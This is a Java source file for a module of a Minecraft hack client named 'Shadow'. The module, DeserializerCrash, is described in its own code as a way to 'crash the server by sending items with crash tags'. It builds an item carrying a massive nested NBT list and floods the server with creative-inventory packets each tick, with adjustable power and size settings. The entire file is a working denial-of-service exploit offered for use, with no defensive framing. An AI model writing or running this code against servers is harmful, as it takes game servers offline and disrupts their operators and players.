package net.shadow.feature.module;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;

public class DeserializerCrash extends Module {
    final SliderValue repeat = this.config.create("Power", 2, 1, 40, 0);
    final SliderValue psize = this.config.create("Size", 2, 1, 4, 0);
    ItemStack serializer = new ItemStack(Items.PLAYER_HEAD, 1);

    public DeserializerCrash() {
        super ("Deserializer", "crash the server by sending items with crash tags", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        serializer = new ItemStack(Items.PLAYER_HEAD, 1);
        NbtCompound main = new NbtCompound();
        main.put("malloc", makeLaggyList());
        serializer.setNbt(main);
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        for(int i = 0; i < repeat.getThis(); i++){
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(3, serializer));
        }
    }

    @Override
    public void onRender() {
    }


    private NbtList makeLaggyList(){
        NbtList laggy = new NbtList();
        for(int i = 0; i < psize.getThis() * 10000; i++){
            NbtCompound comp = new NbtCompound();
            NbtList malloc4 = new NbtList();
            malloc4.add(new NbtCompound());
            comp.put("0", malloc4);
            laggy.add(comp);
        }
        return laggy;
    }


}

